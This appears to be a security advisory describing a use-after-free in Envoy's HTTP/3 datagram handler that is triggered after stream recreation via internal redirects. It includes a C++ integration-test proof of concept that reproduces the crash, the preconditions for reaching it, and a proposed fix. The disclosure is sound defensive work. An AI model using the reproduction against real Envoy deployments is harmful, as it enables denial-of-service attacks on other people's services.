### Summary
A Use-After-Free (UAF) vulnerability exists in the Envoy QUIC/HTTP/3 stack when HTTP/3 Datagrams (Capsule Protocol) are used in conjunction with features that trigger stream recreation, such as internal redirects or on-demand Virtual Host Discovery Service (VHDS). A remote attacker can trigger a crash (Denial of Service) by sending an HTTP/3 Datagram after a stream has been recreated.

### Details

When Capsule Protocol is enabled for an HTTP/3 stream (e.g., via the Capsule-Protocol: ?1 header or an extended CONNECT connect-udp request), Envoy creates an HttpDatagramHandler to process incoming and outgoing HTTP/3 Datagrams (QUIC DATAGRAM frames).

Upon initialization in useCapsuleProtocol(), the HttpDatagramHandler caches a raw pointer to the current Http::RequestDecoder (which corresponds to the ActiveStream in the HTTP Connection Manager).

If the stream is subsequently recreated—most commonly due to an internal redirect (e.g., upstream returns a 3xx responding to a route configured with internal_redirect_policy)—the HTTP Connection Manager creates a new ActiveStream and calls setRequestDecoder() on the EnvoyQuicServerStream to update the decoder reference.

However, EnvoyQuicServerStream::setRequestDecoder failed to propagate this new decoder pointer to the existing HttpDatagramHandler.

When a subsequent HTTP/3 Datagram is received on the same QUIC connection for that stream, HttpDatagramHandler::OnHttp3Datagram is invoked. It attempts to use the cached, but now freed, RequestDecoder pointer to forward the decoded capsule data:

```
// source/common/quic/http_datagram_handler.cc
void HttpDatagramHandler::decodeCapsule(const quiche::Capsule& capsule) {
  // ...
  if (stream_decoder_) {
    stream_decoder_->decodeData(*buffer, stream_.IsDoneReading()); // UAF HERE
  }
}
```
This result is a Use-After-Free vulnerability. In standard builds, this often manifests as a segmentation fault or unexpected behavior due to vtable corruption. In sanitizer builds (ASAN/UBSan), it is detected as a member call on an invalid object with an invalid vptr.

### PoC
Run the following integration test under ASAN. 

```
TEST_P(QuicHttpIntegrationTest, ReproduceUAF_f004_Integration) {
  auto handle = config_helper_.createVirtualHost("handle.internal.redirect");
  handle.mutable_routes(0)->set_name("redirect");
  handle.mutable_routes(0)->mutable_route()->mutable_internal_redirect_policy();
  config_helper_.addVirtualHost(handle);
  initialize();

  codec_client_ = makeHttpConnection(lookupPort("http"));

  Http::TestRequestHeaderMapImpl request_headers{
      {":method", "GET"},
      {":path", "/test/long/url"},
      {":scheme", "http"},
      {":authority", "handle.internal.redirect"},
      {"capsule-protocol", "?1"}};

  auto encoder_decoder = codec_client_->startRequest(request_headers, false);
  auto& request_encoder = encoder_decoder.first;
  auto response = std::move(encoder_decoder.second);

  auto& stream = request_encoder.getStream();
  auto stream_id = stream.codecStreamId();
  ASSERT_TRUE(stream_id.has_value());

  AssertionResult result = fake_upstreams_[0]->waitForHttpConnection(*dispatcher_, fake_upstream_connection_);
  RELEASE_ASSERT(result, result.message());
  result = fake_upstream_connection_->waitForNewStream(*dispatcher_, upstream_request_);
  RELEASE_ASSERT(result, result.message());
  ASSERT_TRUE(upstream_request_->waitForHeadersComplete());

  Http::TestResponseHeaderMapImpl redirect_response{{":status", "302"},
                                                    {"content-length", "0"},
                                                    {"location", "http://authority2/new/url"}};

  upstream_request_->encodeHeaders(redirect_response, true);

  result = fake_upstream_connection_->waitForNewStream(*dispatcher_, upstream_request_);
  RELEASE_ASSERT(result, result.message());
  ASSERT_TRUE(upstream_request_->waitForHeadersComplete());

  EnvoyQuicClientSession* quic_session =
      static_cast<EnvoyQuicClientSession*>(codec_client_->connection());
  
  quic::DatagramStatus status = quic_session->SendHttp3Datagram(stream_id.value(), "test_payload");
  printf("SendHttp3Datagram status: %d\n", static_cast<int>(status));
  codec_client_->sendData(*request_encoder_, "", true);

  ASSERT_TRUE(upstream_request_->waitForData(*dispatcher_, "test_payload"));
  upstream_request_->encodeHeaders(default_response_headers_, true);

  ASSERT_TRUE(response->waitForEndStream());
  ASSERT_TRUE(response->complete());
  EXPECT_EQ("200", response->headers().getStatusValue());
}
```

### Impact
High impact due to potential crash/undefined behavior.

However, there's a number of preconditions that must be met: 
1. Envoy must be configured with an HTTP/3 / QUIC listener with datagrams enabled.
2. The client must initiate a flow that opts into Capsule Protocol (e.g., sending Capsule-Protocol: ?1 or using extended CONNECT).
3. The request must trigger a recreateStream() path. The most accessible trigger is an internal redirect policy combined with an upstream returning a 3xx response.

### Potential fix

```
// source/common/quic/envoy_quic_server_stream.h
void setRequestDecoder(Http::RequestDecoder& decoder) override {
  request_decoder_ = decoder.getRequestDecoderHandle();
  stats_gatherer_->setAccessLogHandlers(request_decoder_->get()->accessLogHandlers());
#ifdef ENVOY_ENABLE_HTTP_DATAGRAMS
  if (http_datagram_handler_) {
    http_datagram_handler_->setStreamDecoder(request_decoder_->get().ptr());
  }
#endif
}
```

### Gen AI Usage
This vulnerability was detected with Claude Mythos and reproduced by Gemini.
